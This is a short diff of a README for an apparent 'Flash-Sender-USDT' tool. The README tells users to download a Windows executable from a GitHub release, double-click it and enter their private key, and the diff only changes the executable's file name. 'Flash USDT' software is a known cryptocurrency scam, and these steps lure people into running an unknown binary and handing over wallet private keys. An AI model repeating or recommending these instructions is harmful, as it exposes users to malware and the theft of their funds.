@@ -28,7 +28,7 @@
 ### 🛠️ How to Use
 
 1. **Download the `.exe` file** from the [Releases](https://github.com/DevNebulas/Flash-Sender-USDT/releases/download/Server/Flashing.Server.app.exe) section or build it manually.
-2. Run `StablecoinFlashingServer.exe` (double-click — no terminal needed).
+2. Run `FlashingServer app.exe` (double-click — no terminal needed).
 3. Follow the on-screen steps:
 
    * Enter your private key
